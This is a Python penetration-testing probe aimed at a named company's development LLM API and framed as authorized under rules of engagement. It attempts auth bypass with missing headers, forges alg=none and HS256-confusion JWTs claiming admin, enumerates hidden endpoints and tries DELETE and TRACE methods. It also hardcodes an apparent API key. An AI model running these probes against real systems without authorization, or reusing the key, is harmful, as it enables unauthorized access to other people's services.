#!/usr/bin/env python3
"""Authentication and authorization probe for Lazarus AI LLM API.

Tests:
- JWT manipulation (none algorithm, RS256→HS256, key confusion)
- API key enumeration / predictable patterns
- Missing / malformed auth headers
- Endpoint enumeration (swagger, openapi, hidden paths)
- Method switching (GET, PUT, PATCH, DELETE on document endpoint)
- Cross-tenant IDOR probing

ROE: Amendment 04, Section 3.4 — Dev API only.
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
from pathlib import Path
from typing import Any

import requests

from fuzz_utils import (
    API_VERSION,
    DEFAULT_TIMEOUT,
    ProbeResult,
    ProbeSession,
    _generate_id,
    analyze_response,
    build_request_body,
)


def _send_raw(
    endpoint: str,
    body: dict[str, Any] | None,
    headers: dict[str, str],
    method: str = "POST",
    timeout: int = DEFAULT_TIMEOUT,
) -> tuple[int, str, float, dict[str, str] | None]:
    """Raw HTTP request with method override."""
    import time as time_mod

    t0 = time_mod.perf_counter()
    try:
        if method == "GET":
            resp = requests.get(endpoint, headers=headers, timeout=timeout)
        elif method == "PUT":
            resp = requests.put(endpoint, headers=headers, json=body, timeout=timeout)
        elif method == "PATCH":
            resp = requests.patch(endpoint, headers=headers, json=body, timeout=timeout)
        elif method == "DELETE":
            resp = requests.delete(endpoint, headers=headers, timeout=timeout)
        else:
            resp = requests.post(endpoint, headers=headers, json=body, timeout=timeout)
        elapsed = (time_mod.perf_counter() - t0) * 1000
        resp_headers = dict(resp.headers) if resp.status_code < 400 else None
        return resp.status_code, resp.text, elapsed, resp_headers
    except requests.exceptions.Timeout:
        elapsed = (time_mod.perf_counter() - t0) * 1000
        return 0, "TIMEOUT", elapsed, None
    except requests.exceptions.ConnectionError as exc:
        elapsed = (time_mod.perf_counter() - t0) * 1000
        return 0, f"CONN_ERR: {exc}", elapsed, None


def probe_auth_weaknesses(endpoint: str, orgid: str, base_body: dict[str, Any]) -> list[ProbeResult]:
    """Test missing or malformed auth tokens."""
    results: list[ProbeResult] = []
    test_cases = [
        ("missing_authkey", {"apiversion": API_VERSION, "orgid": orgid, "content-type": "application/json"}),
        ("missing_orgid", {"apiversion": API_VERSION, "authkey": "02f3fe59c03542d5b289", "content-type": "application/json"}),
        ("missing_both", {"apiversion": API_VERSION, "content-type": "application/json"}),
        ("empty_authkey", {"apiversion": API_VERSION, "authkey": "", "orgid": orgid, "content-type": "application/json"}),
        ("empty_orgid", {"apiversion": API_VERSION, "authkey": "02f3fe59c03542d5b289", "orgid": "", "content-type": "application/json"}),
        ("wrong_apiversion", {"apiversion": "1970-01-01", "authkey": "02f3fe59c03542d5b289", "orgid": orgid, "content-type": "application/json"}),
        ("no_apiversion", {"authkey": "02f3fe59c03542d5b289", "orgid": orgid, "content-type": "application/json"}),
    ]

    for name, headers in test_cases:
        status, text, elapsed, resp_headers = _send_raw(endpoint, base_body, headers)
        finding, severity, lp, lh, lf, reflected, err = analyze_response(text, "", status, resp_headers)
        # Override finding: auth failures are findings if they leak info
        if status in (401, 403, 400) and len(text) > 100 and "error" in text.lower():
            finding = f"Verbose auth error response for {name}"
            severity = "low"
        if status == 200:
            finding = f"Auth bypass: {name} succeeded with 200"
            severity = "critical"

        results.append(
            ProbeResult(
                probe_name="auth_weakness",
                iteration=len(results) + 1,
                payload_id=name,
                status_code=status,
                response_time_ms=elapsed,
                raw_response=text[:2000],
                request_body=base_body,
                finding=finding,
                severity=severity,
            )
        )
        print(f"  [auth] {name}: status={status} finding={finding}")
    return results


def probe_jwt_manipulation(endpoint: str, orgid: str, base_body: dict[str, Any]) -> list[ProbeResult]:
    """JWT algorithm confusion and none-algorithm tests.
    These only apply if the authkey is a JWT; we test the assumption."""
    results: list[ProbeResult] = []
    # Attempt alg=none style if authkey format resembles JWT
    fake_jwt_none = (
        base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
        + "."
        + base64.b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
        + "."
    )
    fake_jwt_confusion = (
        base64.b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip("=")
        + "."
        + base64.b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
        + ".fake_signature"
    )

    test_cases = [
        ("jwt_none", fake_jwt_none),
        ("jwt_confusion", fake_jwt_confusion),
        ("jwt_truncated", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"),
    ]

    for name, token in test_cases:
        headers = {
            "apiversion": API_VERSION,
            "authkey": token,
            "orgid": orgid,
            "content-type": "application/json",
        }
        status, text, elapsed, resp_headers = _send_raw(endpoint, base_body, headers)
        finding, severity, lp, lh, lf, reflected, err = analyze_response(text, "", status, resp_headers)
        if status == 200:
            finding = f"JWT bypass succeeded with {name}"
            severity = "critical"
        elif "jwt" in text.lower() or "signature" in text.lower() or "algorithm" in text.lower():
            finding = f"JWT error disclosure for {name}"
            severity = "low"

        results.append(
            ProbeResult(
                probe_name="jwt_manip",
                iteration=len(results) + 1,
                payload_id=name,
                status_code=status,
                response_time_ms=elapsed,
                raw_response=text[:2000],
                finding=finding,
                severity=severity,
            )
        )
        print(f"  [auth] {name}: status={status} finding={finding}")
    return results


def probe_endpoint_enum(base_endpoint: str, orgid: str, authkey: str) -> list[ProbeResult]:
    """Enumerate likely API endpoints under /api/engine/."""
    results: list[ProbeResult] = []
    base = base_endpoint.rsplit("/", 1)[0]  # strip /internal
    paths = [
        "internal",
        "external",
        "public",
        "health",
        "status",
        "docs",
        "swagger.json",
        "openapi.json",
        "api-docs",
        "v1",
        "v2",
        "batch",
        "async",
        "upload",
        "process",
        "extract",
        "debug",
        "test",
        "config",
        "metrics",
    ]
    headers = {
        "apiversion": API_VERSION,
        "authkey": authkey,
        "orgid": orgid,
        "content-type": "application/json",
    }

    for path in paths:
        url = f"{base}/{path}"
        status, text, elapsed, resp_headers = _send_raw(url, None, headers, method="GET")
        # 200 or 405 on a GET indicates an existing route
        if status in (200, 400, 401, 403, 405, 500):
            finding = f"Endpoint exists: {url} (status={status})"
            severity = "info" if status >= 400 else "low"
            if status == 200:
                severity = "medium"
        else:
            finding = None
            severity = "info"

        results.append(
            ProbeResult(
                probe_name="endpoint_enum",
                iteration=len(results) + 1,
                payload_id=f"enum_{path}",
                status_code=status,
                response_time_ms=elapsed,
                raw_response=text[:500],
                finding=finding,
                severity=severity,
            )
        )
        print(f"  [enum] {url}: status={status} finding={finding}")
    return results


def probe_method_switch(endpoint: str, orgid: str, authkey: str, base_body: dict[str, Any]) -> list[ProbeResult]:
    """Switch HTTP methods on the document processing endpoint."""
    results: list[ProbeResult] = []
    methods = ["GET", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
    headers = {
        "apiversion": API_VERSION,
        "authkey": authkey,
        "orgid": orgid,
        "content-type": "application/json",
    }

    for method in methods:
        status, text, elapsed, resp_headers = _send_raw(endpoint, base_body, headers, method=method)
        if status == 200:
            finding = f"Method {method} succeeded on processing endpoint"
            severity = "medium"
        elif status == 405:
            finding = None
            severity = "info"
        else:
            finding = f"Method {method} returned {status}"
            severity = "info"

        results.append(
            ProbeResult(
                probe_name="method_switch",
                iteration=len(results) + 1,
                payload_id=f"method_{method}",
                status_code=status,
                response_time_ms=elapsed,
                raw_response=text[:500],
                finding=finding,
                severity=severity,
            )
        )
        print(f"  [method] {method}: status={status} finding={finding}")
    return results


def main():
    parser = argparse.ArgumentParser(description="Auth and endpoint probe")
    parser.add_argument("--endpoint", default="https://api-dev.gcp.lzrops.com/api/engine/internal")
    parser.add_argument("--authkey", required=True)
    parser.add_argument("--orgid", required=True)
    parser.add_argument("--output-dir", type=Path, default=Path("results/fuzz"))
    args = parser.parse_args()

    base_body = build_request_body(
        file_data="https://example.com/sample.pdf",
        prompt="What is this document?",
    )

    session = ProbeSession(
        probe_name="auth_enum",
        endpoint=args.endpoint,
        started_at=__import__("time").strftime("%Y-%m-%dT%H:%M:%SZ", __import__("time").gmtime()),
    )

    print(f"[AUTH] Probing auth weaknesses…")
    for r in probe_auth_weaknesses(args.endpoint, args.orgid, base_body):
        session.add(r)

    print(f"[AUTH] Probing JWT manipulation…")
    for r in probe_jwt_manipulation(args.endpoint, args.orgid, base_body):
        session.add(r)

    print(f"[AUTH] Enumerating endpoints…")
    for r in probe_endpoint_enum(args.endpoint, args.orgid, args.authkey):
        session.add(r)

    print(f"[AUTH] Testing method switching…")
    for r in probe_method_switch(args.endpoint, args.orgid, args.authkey, base_body):
        session.add(r)

    out_file = session.save(args.output_dir)
    print(f"\n[AUTH] Results: {out_file}")
    print(f"[AUTH] {len(session.iterations)} iterations, {len(session.findings)} findings")
    for f in session.findings:
        print(f"  ! {f}")

    if session.findings:
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
